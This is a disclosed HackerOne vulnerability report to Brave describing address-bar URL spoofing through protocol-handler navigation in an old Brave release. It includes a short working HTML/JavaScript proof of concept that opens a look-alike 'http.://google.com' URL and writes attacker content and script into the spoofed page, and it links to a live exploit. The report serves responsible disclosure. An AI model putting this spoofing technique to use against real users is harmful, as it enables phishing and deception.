# URL spoofing using protocol handlers

## Report Details
- **Report ID**: 373721
- **URL**: https://hackerone.com/reports/373721
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-06-29T04:50:18.539Z
- **Disclosed**: 2018-10-04T00:50:59.744Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
Navigation to protocol handler changes URL in the address bar (e.g. `ssh://google.com` in the address bar is standard behavior).

Browsers change URL in the address bar to `about:blank` if a parent window tries to access the opened page with protocol handler URL. This behavior prevents URL spoofing.
 
However, Brave doesn't clear address bar after navigation to protocol handler URL -> URL spoofing.

## Products affected: 
 
Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87


## Steps To Reproduce:

Minimal PoC:

> "http." instead of "http" looks good

```
<body>
    <script>
        window.onclick = () => {
            x = window.open('http.://google.com')
            setTimeout(() => {
                x.document.write(`Hello Google.com! <button onclick="alert('I can run JS on this page!')">Click me!</button>`)
            }, 1000)
        }
    </script>
</body>
```

## Supporting Material/References:

[Live PoC](https://brave-spoofing-rand-protocol-yepftucakb.now.sh/exploit)
[Screencast](https://brave-spoofing-rand-protocol-yepftucakb.now.sh/brave-url-spoofing-notreal-protocol.mp4)

## Impact

URL spoofing 😈

## Attachments
- exploit.html
- brave-url-spoofing-notreal-protocol.mp4
